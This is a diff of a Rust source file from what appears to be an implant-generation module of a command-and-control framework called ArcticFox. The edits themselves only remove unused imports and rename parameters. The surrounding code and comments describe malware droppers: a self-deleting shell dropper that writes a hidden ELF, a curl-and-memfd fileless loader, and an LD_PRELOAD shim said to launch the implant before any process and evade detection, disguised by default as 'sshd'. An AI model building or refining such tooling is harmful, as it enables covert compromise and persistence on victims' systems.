@@ -12,11 +12,9 @@
 //! All payloads are controllable via the C2 API:
 //!   POST /api/admin/payload/generate  { "type": "raw_binary", "os": "linux", "arch": "x86_64", "repos": [...] }
 
-use std::path::PathBuf;
-use tracing::{debug, error, info};
 
 use arcticfox_core::crypto::generate_session_key;
-use arcticfox_core::error::{ArcticFoxError, Result};
+use arcticfox_core::error::Result;
 
 // ── Payload Types ───────────────────────────────────────────────────────────
 
@@ -136,12 +134,12 @@ pub fn generate_payload_spec(
 /// The script base64-decodes the embedded ELF, writes it to a hidden path,
 /// chmods, and execs. Self-deletes the script after execution.
 fn generate_shell_dropper(
-    key_hex: &str,
+    _key_hex: &str,
     repos: &[String],
     stealth_name: Option<&str>,
 ) -> String {
     let name = stealth_name.unwrap_or("sshd");
-    let repo_args: String = repos
+    let _repo_args: String = repos
         .iter()
         .map(|r| format!(" -r '{}'", r))
         .collect();
@@ -172,7 +170,7 @@ rm -f "$0"
 /// Downloads the binary via curl, creates memfd, writes, execs.
 /// Works on any Linux with Python 3.
 fn generate_memfd_loader(
-    key_hex: &str,
+    _key_hex: &str,
     repos: &[String],
     stealth_name: Option<&str>,
 ) -> String {
@@ -196,7 +194,7 @@ fn generate_memfd_loader(
 /// the real binary. Loaded by ld.so before any process starts.
 /// Undetectable by process enumeration because it loads before
 /// everything including init.
-fn generate_ld_preload_shim(key_hex: &str, repos: &[String]) -> String {
+fn generate_ld_preload_shim(_key_hex: &str, repos: &[String]) -> String {
     let repo_list = repos.join(",");
     format!(
         r#"// LD_PRELOAD shim — spawns ArcticFox implant before any exec
